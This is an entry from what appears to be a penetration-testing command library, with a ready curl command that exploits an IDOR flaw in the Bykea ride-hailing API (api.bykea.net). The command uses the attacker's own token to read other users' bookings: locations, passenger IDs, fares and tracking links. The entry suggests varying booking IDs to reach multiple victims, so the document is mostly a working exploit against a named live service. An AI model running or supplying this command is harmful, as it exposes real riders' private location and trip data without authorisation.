---
data: >-
  curl -X GET
  "https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}"
  -H "User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0)
  Alamofire/1.0.169" -H "X-App-Version:1.0.169"
tags:
  - api
  - get
  - idor
type: command
output: >-
  {"code":200,"success":true,"message":"Successfully loaded booking
  details","data":{... (full booking details including locations, passenger_id,
  fare, status, etc.)}}
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.820Z'
id: c9d06620-59b1-4268-805c-2efd02a1b860
verified: false
validated: true
submitted: true
---
# bykea-get-booking-details

## Command

```bash
curl -X GET "https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}" \
  -H "User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169" \
  -H "X-App-Version:1.0.169"
```

## Description

Retrieves booking details via Bykea API, exploiting IDOR by using a foreign booking_id with attacker's auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| booking_id | Target booking ID (path param) | Yes |
| _id | Attacker's user ID (query) | Yes |
| token_id | Attacker's access token (query) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.bykea.net/api/v1/bookings/███?_id=...&token_id=..." -H "..."
```

### Advanced Usage

Vary booking_id to test multiple victims.

## Expected Output

{"code":200,"success":true,"message":"Successfully loaded booking details","data":{pickup/dropoff locations, passenger_id, trip_no, status, fare, tracking link, cancellation reasons}}.

## Related

- [[procedures/Exploit-IDOR-on-Booking-Details]]
